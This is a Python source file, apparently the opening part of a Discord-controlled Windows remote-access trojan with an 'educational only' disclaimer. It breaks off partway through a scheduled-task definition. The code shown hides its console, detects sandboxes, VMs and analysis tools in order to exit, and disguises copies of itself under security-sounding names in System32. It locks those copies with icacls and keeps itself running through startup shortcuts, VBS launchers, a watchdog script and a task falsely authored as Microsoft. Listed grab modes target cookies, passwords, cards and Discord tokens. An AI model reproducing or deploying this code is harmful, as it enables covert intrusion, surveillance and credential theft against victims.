#  __  __       _          _    ____
# |  \/  | __ _| |_ ___   / \  / ___|
# | |\/| |/ _` | __/ _ \ / _ \| |  _
# | |  | | (_| | ||  __// ___ \ |_| |
# |_|  |_|\__,_|\__\___/_/   \_\____|
#
# (c) Copyright 2026 - MateAG
# All rights reserved. Any copy without
# consent of this code will be reported.
#
# This project is only for educational purposes.
# The creator is NOT responsible of any illegal/malicious use
# of this project.
#
# The creator advices you to use this for testing and
# legal activities. If you want to install this on
# someone else computer, please ask them for the
# permission to.
#
# Thank you and happy testing! <3

import os
import sys
import time
from aiohttp import web
import secrets
import hmac 
import shlex
import traceback
import faulthandler

_CRASH_DIRS = []
try:
    _CRASH_DIRS.append(os.path.join(os.environ.get("WINDIR") or r"C:\Windows",
                                    "System32", "LessMiError"))
except Exception:
    pass
_CRASH_DIRS += [
    os.path.join(os.environ.get("ProgramData") or r"C:\ProgramData", "LessMiError"),
    os.path.join(os.environ.get("TEMP") or r"C:\Windows\Temp", "LessMiError"),
    os.path.join(os.environ.get("APPDATA") or os.path.expanduser("~"), "LessMiError"),
]
_THREADS_ON = False


def _crash_dir():
    for d in _CRASH_DIRS:
        try:
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, ".probe"), "a"):
                pass
            return d
        except Exception:
            continue
    return os.path.expanduser("~")


CRASH_DIR = _crash_dir()
CRASH_FILE = os.path.join(CRASH_DIR, "crash.log")


def _is_admin_early():
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _crash(kind, text):
    try:
        with open(CRASH_FILE, "a", encoding="utf-8", errors="replace") as f:
            f.write("\n=== {} [{}] ===\n".format(time.strftime("%Y-%m-%d %H:%M:%S"), kind))
            f.write(text if str(text).endswith("\n") else str(text) + "\n")
    except Exception:
        pass


def _crash_exc(t, v, tb):
    try:
        _crash("exception", "argv: {}\nfrozen: {}\nadmin: {}\nexe: {}\n{}".format(
            sys.argv, getattr(sys, "frozen", False), _is_admin_early(), sys.executable,
            "".join(traceback.format_exception(t, v, tb))))
    except Exception:
        pass


sys.excepthook = _crash_exc

_FAULT_PATH = os.path.join(CRASH_DIR, "fault.log")
try:
    if os.path.exists(_FAULT_PATH) and os.path.getsize(_FAULT_PATH) > 2 * 1024 * 1024:
        os.replace(_FAULT_PATH, _FAULT_PATH + ".old")
except Exception:
    pass
try:
    _FAULT_HANDLE = open(_FAULT_PATH, "a", encoding="utf-8")
    faulthandler.enable(_FAULT_HANDLE)
except Exception:
    _FAULT_HANDLE = None

def _hide_console():
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


_crash("boot", "process start argv={} frozen={} admin={} pid={}".format(
    sys.argv, getattr(sys, "frozen", False), _is_admin_early(), os.getpid()))
_hide_console()

GRAB_SCRIPT = "grab.py"
GRAB_MODES = ("all", "cookies", "history", "cards", "games", "discord", "discorddiag", "passwords", "vm")

import discord
import tempfile
try:
    import Crypto.Cipher.AES
except Exception:
    try:
        import Cryptodome.Cipher.AES
    except Exception:
        pass
import win32com.client
import pythoncom
from discord.ext import commands
import ctypes
import nacl.secret
import nacl.utils
import subprocess
import base64
import json
import sqlite3
import shutil
import threading
import random
import string
import socket
import aiohttp
import aiosqlite
import requests
import builtins
import re
import winsound
import numpy as np
from datetime import datetime
from PIL import ImageGrab
import cv2
import wave
import pyautogui
from pynput import keyboard, mouse
import win32gui
import win32con
import win32api
import win32clipboard
import winreg
import asyncio
import psutil
from pathlib import Path
import math
import sounddevice as sd
from pycaw.pycaw import AudioUtilities
from pygrabber.dshow_graph import FilterGraph
from plyer import notification as plyer_notification
import io
import runpy
import uuid
import hashlib
import zipfile
import glob
import contextlib
import platform
import struct
import tkinter

try:
    threading.excepthook = lambda a: _crash_exc(a.exc_type, a.exc_value, a.exc_traceback)
except Exception:
    pass

timestamp=discord.utils.utcnow()

VM_KILL = True
VM_SCORE_MIN = 5
VM_STRONG_MIN = 1

VM_PROCS_STRONG = [
    "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe", "vmacthlp.exe", "vgauthservice.exe",
    "vboxservice.exe", "vboxtray.exe", "vboxhook.exe", "vboxsds.exe", "vboxheadless.exe",
    "qemu-ga.exe", "xenservice.exe", "prl_cc.exe", "prl_tools.exe",
    "joeboxcontrol.exe", "joeboxserver.exe",
]

VM_PROCS_WEAK = [
    "vmmem", "vmmemwsl", "vmnat.exe", "vmnetdhcp.exe", "vmware-hostd.exe", "vmware-authd.exe",
    "fakenet.exe", "dumpcap.exe", "wireshark.exe", "fiddler.exe", "httpdebuggerui.exe",
    "ida.exe", "ida64.exe", "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "x96dbg.exe",
    "procmon.exe", "procmon64.exe", "processhacker.exe", "pestudio.exe", "dnspy.exe",
    "ksdumper.exe", "ksdumperclient.exe", "sandboxie.exe", "sbiectrl.exe",
    "apimonitor.exe", "regshot.exe", "tcpview.exe", "autoruns.exe", "strings.exe", "cuckoo.exe",
]

VM_FILES_STRONG = [
    r"C:\Windows\System32\vmGuestLib.dll",
    r"C:\Windows\System32\vm3dgl.dll",
    r"C:\Windows\System32\vboxhook.dll",
    r"C:\Windows\System32\vboxmrxnp.dll",
    r"C:\Windows\System32\vboxdisp.dll",
    r"C:\Windows\System32\VBoxService.exe",
    r"C:\Windows\System32\VBoxTray.exe",
    r"C:\Windows\System32\VBoxControl.exe",
    r"C:\Windows\System32\vmsrvc.dll",
    r"C:\Windows\System32\drivers\vmsrvc.sys",
    r"C:\Windows\System32\drivers\vm3dmp.sys",
    r"C:\Windows\System32\drivers\vmmouse.sys",
    r"C:\Windows\System32\drivers\vmhgfs.sys",
    r"C:\Windows\System32\drivers\vboxguest.sys",
    r"C:\Windows\System32\drivers\vboxmouse.sys",
    r"C:\Windows\System32\drivers\vboxsf.sys",
    r"C:\Windows\System32\drivers\vboxvideo.sys",
    r"C:\Windows\System32\drivers\VBoxSF.sys",
    r"C:\Windows\System32\drivers\xennet.sys",
    r"C:\Windows\System32\drivers\qemu-ga.sys",
]

VM_FILES_WEAK = [
    r"C:\Windows\System32\vmci.dll",
    r"C:\Windows\System32\SbieDll.dll",
    r"C:\Windows\System32\drivers\prleth.sys",
    r"C:\Windows\System32\drivers\prlfs.sys",
    r"C:\Windows\System32\drivers\prl_mouf.sys",
]

VM_DIRS_STRONG = [
    r"C:\Program Files\Oracle\VirtualBox Guest Additions",
    r"C:\Program Files\VMware\VMware Tools",
    r"C:\Program Files (x86)\VMware\VMware Tools",
]

VM_DIRS_WEAK = [
    r"C:\Program Files\Sandboxie",
    r"C:\Program Files\Wireshark",
    r"C:\Program Files\Microsoft Monitoring Agent",
    r"C:\Program Files (x86)\Microsoft Visual Studio\Shared\Python37_64",
    r"C:\agent",
    r"C:\sandbox",
    r"C:\insanalytics",
    r"C:\ProgramData\VBox",
    r"C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection",
]

VM_REG_STRONG = [
    r"SOFTWARE\VMware, Inc.\VMware Tools",
    r"SOFTWARE\Oracle\VirtualBox Guest Additions",
    r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
    r"SYSTEM\CurrentControlSet\Services\VBoxMouse",
    r"SYSTEM\CurrentControlSet\Services\VBoxSF",
    r"SYSTEM\CurrentControlSet\Services\VBoxVideo",
    r"SYSTEM\CurrentControlSet\Services\vmhgfs",
    r"SYSTEM\CurrentControlSet\Services\vmmouse",
    r"SYSTEM\CurrentControlSet\Services\vmrawdsk",
    r"SYSTEM\CurrentControlSet\Services\vmusbmouse",
    r"SYSTEM\CurrentControlSet\Services\vmx_svga",
    r"SYSTEM\CurrentControlSet\Services\qemufwcfg",
    r"SYSTEM\CurrentControlSet\Services\xen",
    r"SYSTEM\CurrentControlSet\Services\prl_eth",
]

VM_REG_WEAK = [
    r"SYSTEM\CurrentControlSet\Services\vmci",
    r"SYSTEM\CurrentControlSet\Services\vmnetadapter",
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Sandboxie",
]

VM_MAC = (
    "00:05:69", "00:0c:29", "00:1c:14", "00:50:56", "00:0f:4b",
    "08:00:27", "0a:00:27", "00:21:f6", "00:03:ff",
    "52:54:00", "00:15:5d", "00:16:3e", "00:1c:42",
)

VM_STRONG = (
    "vmware", "virtualbox", "innotek", "qemu", "xen", "parallels", "bochs",
    "virtual machine", "virtual hd", "hyper-v", "kvm", "bhyve", "openstack",
)

VM_WEAK = (
    "sandbox", "virus", "malware", "sample", "cuckoo", "analyst", "wdagutility",
    "anyrun", "any.run", "maltest", "testvm", "vmtest", "hybrid", "joesandbox",
)

VM_RES = ((800, 600), (1024, 768), (1152, 864), (1280, 720), (1280, 800), (1280, 1024))


def _vm_processes():
    try:
        return [(p.info.get("name") or "").lower() for p in psutil.process_iter(["name"])]
    except Exception:
        try:
            out = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True, text=True, timeout=20,
                creationflags=0x08000000,
            ).stdout
            return [l.split(",")[0].strip('"').lower() for l in out.splitlines() if l.strip()]
        except Exception:
            return []


def _vm_ps(cmd):
    try:
        return subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command",
             "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; " + cmd],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
            creationflags=0x08000000, timeout=25).stdout or ""
    except Exception:
        return ""


def _vm_wmi(cls, prop):
    out = _vm_ps("(Get-CimInstance Win32_{} -ErrorAction SilentlyContinue).{}".format(cls, prop))
    return " ".join(str(out).split()).lower()


def _vm_mac():
    try:
        node = uuid.getnode()
        return ":".join("{:02x}".format((node >> s) & 0xFF) for s in (40, 32, 24, 16, 8, 0))
    except Exception:
        return ""


def _vm_idle():
    try:
        class LII(ctypes.Structure):
            _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]
        lii = LII()
        lii.cbSize = ctypes.sizeof(LII)
        ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
        return (ctypes.windll.kernel32.GetTickCount() - lii.dwTime) / 1000.0
    except Exception:
        return 0.0


def vm_hits():
    strong, weak = [], []

    procs = set(_vm_processes())
    for name in VM_PROCS_STRONG:
        if name in procs:
            strong.append("proc:" + name)
    for name in VM_PROCS_WEAK:
        if name in procs:
            weak.append("proc:" + name)

    for f in VM_FILES_STRONG:
        if os.path.exists(f):
            strong.append("file:" + os.path.basename(f))
    for f in VM_FILES_WEAK:
        if os.path.exists(f):
            weak.append("file:" + os.path.basename(f))

    for d in VM_DIRS_STRONG:
        if os.path.isdir(d):
            strong.append("dir:" + os.path.basename(d))
    for d in VM_DIRS_WEAK:
        if os.path.isdir(d):
            weak.append("dir:" + os.path.basename(d))

    for path in VM_REG_STRONG:
        try:
            winreg.CloseKey(winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_READ))
            strong.append("reg:" + path.rsplit("\\", 1)[-1])
        except Exception:
            pass
    for path in VM_REG_WEAK:
        try:
            winreg.CloseKey(winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_READ))
            weak.append("reg:" + path.rsplit("\\", 1)[-1])
        except Exception:
            pass

    mac = _vm_mac()
    if mac and mac[:8] in VM_MAC:
        strong.append("mac:" + mac[:8])

    for cls, prop in (("ComputerSystem", "Model"), ("ComputerSystem", "Manufacturer"),
                      ("BIOS", "Manufacturer"), ("BaseBoard", "Manufacturer"),
                      ("BaseBoard", "Product")):
        val = _vm_wmi(cls, prop)
        if not val:
            continue
        for tag in VM_STRONG:
            if tag in val:
                strong.append("wmi:{}/{}".format(prop, tag))
                break

    host = (socket.gethostname() or "").lower()
    user = (os.environ.get("USERNAME") or "").lower()
    for tag in VM_WEAK:
        if tag in host or tag in user:
            weak.append("name:" + tag)
            break
    if len(host) <= 5:
        weak.append("host:short")
    if re.match(r"^(desktop|win|pc|admin|user|test|box)[-0-9a-z]{0,4}$", host):
        weak.append("host:generic")

    try:
        wh = (ctypes.windll.user32.GetSystemMetrics(0), ctypes.windll.user32.GetSystemMetrics(1))
        if wh in VM_RES:
            weak.append("res:{}x{}".format(*wh))
    except Exception:
        pass

    try:
        if psutil.virtual_memory().total // (1024 ** 3) <= 2:
            weak.append("ram:low")
        if psutil.cpu_count(logical=False) == 1:
            weak.append("cpu:1")
        if time.time() - psutil.boot_time() < 900:
            weak.append("uptime:low")
        if len(psutil.pids()) < 60:
            weak.append("pids:low")
    except Exception:
        pass

    if _vm_idle() > 900:
        weak.append("idle")

    return strong, weak


def vm_guard(code=0):
    if not globals().get("VM_KILL", True):
        _crash("vm", "disabled")
        return
    if "--zz-novm" in sys.argv or os.environ.get("LESSMI_NO_VM") == "0":
        _crash("vm", "skipped by flag")
        return
    try:
        strong, weak = vm_hits()
    except Exception as e:
        _crash("vm", "guard error {!r}".format(e))
        return

    kill = len(strong) >= VM_STRONG_MIN or len(weak) >= VM_SCORE_MIN
    _crash("vm", "s={} w={} -> {}".format(
        ",".join(strong) or "-", ",".join(weak) or "-", "exit" if kill else "run"))

    if "--zz-vmkeep" in sys.argv:
        return
    if kill:
        os._exit(9 if "--zz-setup" in sys.argv else code)


vm_guard()


_K32 = ctypes.WinDLL("kernel32", use_last_error=True)
_K32.CreateMutexW.restype = ctypes.c_void_p
_K32.CreateMutexW.argtypes = (ctypes.c_void_p, ctypes.c_int, ctypes.c_wchar_p)
_K32.CloseHandle.restype = ctypes.c_int
_K32.CloseHandle.argtypes = (ctypes.c_void_p,)


def _mutex_name():
    return "Global\\LM_" + _machine_hash()[:16]


def _mutex_claim():
    global _MUTEX
    _mutex_release()
    _MUTEX = _K32.CreateMutexW(None, 0, _mutex_name())
    if not _MUTEX:
        return True
    return ctypes.get_last_error() != 183


def _mutex_release():
    global _MUTEX
    try:
        if _MUTEX:
            _K32.CloseHandle(_MUTEX)
    except Exception:
        pass
    _MUTEX = None


voice_client = None
voice_reconnect = True

imageio_ffmpeg = None
try:
    import imageio_ffmpeg
except ImportError:
    if not getattr(sys, "frozen", False):
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "imageio-ffmpeg"],
                           capture_output=True, check=True)
            import imageio_ffmpeg
        except Exception as e:
            _crash("dep", "imageio-ffmpeg install failed {!r}".format(e))
            imageio_ffmpeg = None

FFMPEG_BIN = "ffmpeg"
if imageio_ffmpeg is not None:
    try:
        FFMPEG_BIN = imageio_ffmpeg.get_ffmpeg_exe()
    except Exception as e:
        _crash("dep", "ffmpeg resolve failed {!r}".format(e))

_voice_gen = 0
_dshow_cache = {"t": 0.0, "devs": []}


def list_dshow_audio_devices():
    if time.time() - _dshow_cache["t"] < 30 and _dshow_cache["devs"]:
        return _dshow_cache["devs"]
    devs = []
    try:
        r = subprocess.run(
            [FFMPEG_BIN, "-hide_banner", "-list_devices", "true", "-f", "dshow", "-i", "dummy"],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
            creationflags=subprocess.CREATE_NO_WINDOW, timeout=15
        )
        text = (r.stdout or "") + (r.stderr or "")
        in_audio = False
        for line in text.splitlines():
            if "DirectShow audio devices" in line:
                in_audio = True
                continue
            if "DirectShow video devices" in line:
                in_audio = False
                continue
            if in_audio:
                m = re.search(r'"([^"]+)"', line)
                if m:
                    devs.append(m.group(1))
    except Exception:
        pass
    _dshow_cache.update(t=time.time(), devs=devs)
    return devs


def _match_dshow(name):
    devs = list_dshow_audio_devices()
    if not devs:
        return name
    low = (name or "").lower()
    for d in devs:
        if d.lower() == low:
            return d
    tokens = [t for t in re.split(r"[^a-z0-9]+", low) if len(t) > 2]

    def score(d):
        dl = d.lower()
        return sum(2 if t in dl else 0 for t in tokens)

    best = max(devs, key=score)
    return best if score(best) else devs[0]


def _dshow_source(device_name):
    return 'audio="{}"'.format(device_name.replace('"', r'\"'))


def _pick_mic():
    mics = get_input_devices()
    if not mics:
        return None
    if selected_mic is not None:
        for m in mics:
            if m["index"] == selected_mic:
                return m["name"]
    return mics[0]["name"]


def _start_stream(client):
    name = _match_dshow(_pick_mic())
    src = discord.FFmpegPCMAudio(
        source=_dshow_source(name),
        executable=FFMPEG_BIN,
        before_options="-f dshow -rtbufsize 100M -thread_queue_size 1024",
        options="-ac 2 -ar 48000 -af aresample=async=1",
    )
    client.play(src, after=_after_stream)
    return name


def _after_stream(err):
    if err:
        _crash("voice", "ffmpeg: {!r}".format(err))


def _voice_watchdog(gen):
    while voice_reconnect and gen == _voice_gen:
        time.sleep(3)
        try:
            vc = voice_client
            if vc and vc.is_connected() and not vc.is_playing() and not vc.is_paused():
                _start_stream(vc)
        except Exception:
            pass

ELEVATED_FLAG = "--zz-elev"
_BOOT_SILENT = any(a in ("--zz-task", "--zz-ui", "--zz-repair", "--zz-setup")
                   for a in sys.argv)
_CNW = 0x08000000

WINLOGON_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
USERINIT_KEY = WINLOGON_KEY
RUN_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
POLICY_RUN = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"

WINDIR = os.environ.get("WINDIR") or r"C:\Windows"
PDATA = os.environ.get("ProgramData") or r"C:\ProgramData"
APPDATA = os.environ.get("APPDATA", os.path.expanduser("~"))

PERSIST_BASES = [
    os.path.join(WINDIR, "System32"),
    os.path.join(PDATA, "Microsoft", "Windows", "Caches"),
    os.path.join(PDATA, "Microsoft"),
]

_MUTEX = None
APP_DIR = ""
_LEGACY_STATE = os.path.join(PDATA, "ZZZ_Security", "state.json")

REPAIR_FLAG = "--zz-repair"
SETUP_FLAG = "--zz-setup"
STATE_VERSION = 5

WATCHDOG_PERIOD = 6
REPAIR_PERIOD = 30
HEARTBEAT_PERIOD = 8
HEARTBEAT_MAX_AGE = 40

_REPAIR_LOCK = threading.Lock()
_WATCH_LOCK = threading.Lock()
_THREADS_STARTED = False

_FALLBACK_NAMES = (
    "runtimebroker", "ctfmon", "backgroundtaskhost", "sihost", "fontdrvhost",
    "dwm", "audiodg", "searchindexer", "smartscreen", "taskhostw",
)

DECOY = ("WinSecHost", "SecHost", "WinSvcHost", "DefenderSvc", "SysGuard",
         "WinTrust", "CfgHost", "SvcHost32", "WinHealth", "SecCenter")


def _watch_vbs_block(flag="--zz-task"):
    return 'wscript //nologo "%S0%.vbs" {}'.format(flag)


def _write_vbs(st):
    slots = st.get("slots") or []
    if not slots:
        return False
    ok = False
    for s in slots:
        exe = s["exe"]
        vbs = exe + ".vbs"
        try:
            os.makedirs(os.path.dirname(vbs), exist_ok=True)
            body = ('Set s = CreateObject("WScript.Shell")\r\n'
                    'If WScript.Arguments.Count > 0 Then\r\n'
                    '  s.Run """" & "{}" & """ " & WScript.Arguments(0), 0, False\r\n'
                    'Else\r\n'
                    '  s.Run """" & "{}" & """", 0, False\r\n'
                    'End If\r\n').format(exe, exe)
            same = False
            try:
                with open(vbs, "r", encoding="utf-8", errors="replace") as f:
                    same = f.read() == body
            except Exception:
                same = False
            if not same:
                with open(vbs, "w", encoding="utf-8", newline="\r\n") as f:
                    f.write(body)
            _hide(vbs, True)
            ok = True
        except Exception:
            pass
    return ok


_WATCH_BAT = """@echo off
setlocal EnableExtensions
if not "%~1"=="" title %~1
set /a R=4
:loop
set "SRC="
if exist "%S0%" set "SRC=%S0%"
{find}
if defined SRC (
{restore}
)
tasklist /nh /fi "imagename eq {name}" 2>nul | find /i "{name}" >nul 2>&1
if errorlevel 1 if exist "%S0%" {vbs}
set /a R+=1
if %R% LSS 6 goto wait
set /a R=0
if exist "%S0%" {vbsr}
:wait
call :sleep 6
goto loop
:sleep
>nul 2>&1 ping -n %1 127.0.0.1
exit /b 0
"""

_watch_proc = None


def _sys32():
    return os.path.join(WINDIR, "System32")


def _machine_hash():
    return hashlib.md5(_machine_seed().encode("utf-8", "replace")).hexdigest()


def _payload_dir():
    return os.path.join(PDATA, "Microsoft", "Windows", "Caches", _machine_hash()[:10])


def _pick_exe_name():
    forced = os.environ.get("LM_NAME")
    if forced:
        return forced
    h = _machine_hash()
    for i in range(48):
        cand = DECOY[int(h[i % 32], 16) % len(DECOY)] + _rand(random.randint(2, 4))
        if not os.path.exists(os.path.join(_sys32(), cand + ".exe")) and \
           not os.path.isdir(os.path.join(_sys32(), cand)):
            return cand + ".exe"
    return DECOY[0] + _rand(6) + ".exe"


def _other_volumes():
    out = []
    try:
        sysdrive = (os.environ.get("SystemDrive") or "C:").upper()
        for part in psutil.disk_partitions(all=False):
            if part.fstype.lower() not in ("ntfs", "fat32", "exfat"):
                continue
            opts = (part.opts or "").lower()
            if "cdrom" in opts:
                continue
            if part.mountpoint.upper().startswith(sysdrive):
                continue
            out.append(part.mountpoint.rstrip("\\/"))
    except Exception:
        pass
    return out


def _slot_dirs():
    h = _machine_hash()[:10]
    dirs = [_payload_dir(), _sys32(), os.path.join(PDATA, "Microsoft", "Caches")]
    for vol in _other_volumes():
        dirs.append(os.path.join(vol, "ProgramData", "Microsoft", "Caches", h))
    seen, out = set(), []
    for d in dirs:
        if d.lower() in seen:
            continue
        seen.add(d.lower())
        out.append(d)
    return out


def _is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _session_id():
    try:
        sid = ctypes.c_ulong()
        ctypes.windll.kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(sid))
        return int(sid.value)
    except Exception:
        return 0


def _ps(cmd):
    try:
        return subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command",
             "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; " + cmd],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
            creationflags=_CNW)
    except Exception:
        return None


def _machine_seed():
    try:
        return str(uuid.getnode())
    except Exception:
        return socket.gethostname()


def _hide(path, hidden=True):
    try:
        flags = ["+h", "+s"] if hidden else ["-h", "-s", "-r"]
        subprocess.run(["attrib", *flags, str(path)], capture_output=True, creationflags=_CNW)
    except Exception:
        pass


def _rand(n):
    a = string.ascii_letters + string.digits
    r = random.SystemRandom()
    return "".join(r.choice(a) for _ in range(n))


def _anchor():
    return os.path.join(_payload_dir(), _machine_hash()[:12] + ".json")


def _hb_path():
    return os.path.join(_payload_dir(), _machine_hash()[:12] + ".hb")


def _app_db():
    return os.path.join(APP_DIR or APPDATA, "data.db")

def _unlock(path):
    try:
        subprocess.run(["attrib", "-r", "-s", "-h", str(path)],
                       capture_output=True, creationflags=_CNW)
    except Exception:
        pass
    try:
        subprocess.run(["icacls", str(path), "/remove:d", "*S-1-5-32-545"],
                       capture_output=True, creationflags=_CNW)
    except Exception:
        pass


def _lock_exe(path):
    p = str(path)
    try:
        subprocess.run(["attrib", "+h", "+s", "+r", p], capture_output=True, creationflags=_CNW)
    except Exception:
        pass
    try:
        subprocess.run(["icacls", p, "/inheritance:r",
                        "/grant:r", "*S-1-5-18:F",
                        "/grant:r", "*S-1-5-32-544:F",
                        "/grant:r", "*S-1-5-32-545:RX",
                        "/deny", "*S-1-5-32-545:(DE,DC)"],
                       capture_output=True, creationflags=_CNW)
    except Exception:
        pass


def _lock_dir(d):
    p = str(d)
    try:
        subprocess.run(["attrib", "+h", "+s", p], capture_output=True, creationflags=_CNW)
    except Exception:
        pass
    try:
        subprocess.run(["icacls", p, "/inheritance:r",
                        "/grant:r", "*S-1-5-18:(OI)(CI)F",
                        "/grant:r", "*S-1-5-32-544:(OI)(CI)F",
                        "/grant:r", "*S-1-5-32-545:(OI)(CI)RX",
                        "/deny", "*S-1-5-32-545:(OI)(CI)(DE,DC)"],
                       capture_output=True, creationflags=_CNW)
    except Exception:
        pass


def _unlock_dir(d):
    try:
        subprocess.run(["icacls", str(d), "/remove:d", "*S-1-5-32-545"],
                       capture_output=True, creationflags=_CNW)
        subprocess.run(["icacls", str(d), "/inheritance:e"],
                       capture_output=True, creationflags=_CNW)
    except Exception:
        pass


def _copy_slot(src, dst):
    try:
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        if os.path.exists(dst):
            _unlock(dst)
        shutil.copy2(src, dst)
        if not os.path.exists(dst) or os.path.getsize(dst) != os.path.getsize(src):
            return False
        _lock_exe(dst)
        return True
    except Exception:
        return False

def _state_read():
    for f in (_anchor(), _LEGACY_STATE):
        try:
            with open(f, "r", encoding="utf-8") as fh:
                d = json.load(fh)
            if d.get("dir") and d.get("exe") and d.get("task") and d.get("mutex"):
                return d
        except Exception:
            pass
    return None


def _state_write(d):
    try:
        os.makedirs(os.path.dirname(_anchor()), exist_ok=True)
        with open(_anchor(), "w", encoding="utf-8") as fh:
            json.dump(d, fh)
        _hide(_anchor(), True)
    except Exception:
        pass
    if not APP_DIR:
        return
    try:
        os.makedirs(APP_DIR, exist_ok=True)
        conn = sqlite3.connect(os.path.join(APP_DIR, "data.db"))
        conn.execute("CREATE TABLE IF NOT EXISTS persist (key TEXT PRIMARY KEY, value TEXT)")
        for k, v in d.items():
            conn.execute("INSERT OR REPLACE INTO persist VALUES (?, ?)", (k, str(v)))
        conn.commit()
        conn.close()
    except Exception:
        pass


def _ensure_state():
    st = _state_read()
    if st and st.get("v") == STATE_VERSION and st.get("slots") and st.get("wmi"):
        return st

    h = _machine_hash()
    name = _pick_exe_name()
    base = os.path.splitext(name)[0]
    slots = [{"exe": os.path.join(d, name)} for d in _slot_dirs()]

    names = [base, base + "Mon", base + "Svc"][:max(1, min(3, len(slots)))]

    d = {
        "v": STATE_VERSION,
        "dir": _payload_dir(),
        "exe": slots[0]["exe"],
        "bak": slots[1]["exe"] if len(slots) > 1 else slots[0]["exe"],
        "slots": slots,
        "task": _TASK_DIR + names[0],
        "tasks": [_TASK_DIR + n for n in names],
        "wmi": "LM_" + h[:14],
        "lnk": "WinSecHost.lnk",
        "mutex": (st or {}).get("mutex") or _rand(14),
        "appdir": (st or {}).get("appdir") or _rand(11),
        "created": (st or {}).get("created") or int(time.time()),
    }
    _state_write(d)
    _crash("state", "created slots={} exe={}".format(len(slots), d["exe"]))
    return d


def _targets():
    st = _ensure_state()
    return st["task"], Path(st["dir"]), Path(st["exe"])

def _reg_add(key, name, value, typ="REG_SZ", hive="HKLM"):
    try:
        root = winreg.HKEY_LOCAL_MACHINE if hive.upper() == "HKLM" else winreg.HKEY_CURRENT_USER
        t = winreg.REG_SZ if typ == "REG_SZ" else winreg.REG_DWORD
        v = value if typ == "REG_SZ" else int(value)
        k = winreg.CreateKeyEx(root, key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, name, 0, t, v)
        winreg.CloseKey(k)
        return True
    except Exception:
        pass
    try:
        h = "HKLM" if hive.upper() == "HKLM" else "HKCU"
        r = subprocess.run(["reg", "add", "{}\\{}".format(h, key), "/v", name, "/t", typ,
                            "/d", str(value), "/f"], capture_output=True, creationflags=_CNW)
        return r.returncode == 0
    except Exception:
        return False


def _reg_query(key, name, hive="HKLM"):
    try:
        root = winreg.HKEY_LOCAL_MACHINE if hive.upper() == "HKLM" else winreg.HKEY_CURRENT_USER
        k = winreg.OpenKey(root, key, 0, winreg.KEY_QUERY_VALUE)
        v, _ = winreg.QueryValueEx(k, name)
        winreg.CloseKey(k)
        return v
    except Exception:
        return None


def _reg_delete(key, name, hive="HKLM"):
    try:
        h = "HKLM" if hive.upper() == "HKLM" else "HKCU"
        subprocess.run(["reg", "delete", "{}\\{}".format(h, key), "/v", name, "/f"],
                       capture_output=True, creationflags=_CNW)
    except Exception:
        pass


def _startup_dir():
    return os.path.join(PDATA, r"Microsoft\Windows\Start Menu\Programs\StartUp")


def _write_lnk(exe):
    st = _state_read() or {}
    lnk = os.path.join(_startup_dir(), st.get("lnk") or "WinSecHost.lnk")
    try:
        os.makedirs(_startup_dir(), exist_ok=True)
        pythoncom.CoInitialize()
        sh = win32com.client.Dispatch("WScript.Shell")
        s = sh.CreateShortCut(lnk)
        s.TargetPath = exe
        s.Arguments = "--zz-ui"
        s.WorkingDirectory = os.path.dirname(exe)
        s.WindowStyle = 7
        s.Description = "Windows Security Host"
        s.Save()
        _hide(lnk, True)
        return True
    except Exception:
        return False


def _del_lnk():
    st = _state_read() or {}
    for n in {st.get("lnk") or "WinSecHost.lnk", "WinSecHost.lnk"}:
        try:
            os.remove(os.path.join(_startup_dir(), n))
        except Exception:
            pass

_TASK_DIR = "\\Microsoft\\Windows\\"
_TASK_SDDL = "D:PAI(A;;GA;;;BA)(A;;GA;;;SY)(A;;GRGX;;;BU)(A;;GRGX;;;AU)"

_TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>{desc}</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>{sid}</UserId>
      <Delay>PT{d1}S</Delay>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT{d2}S</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{sid}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
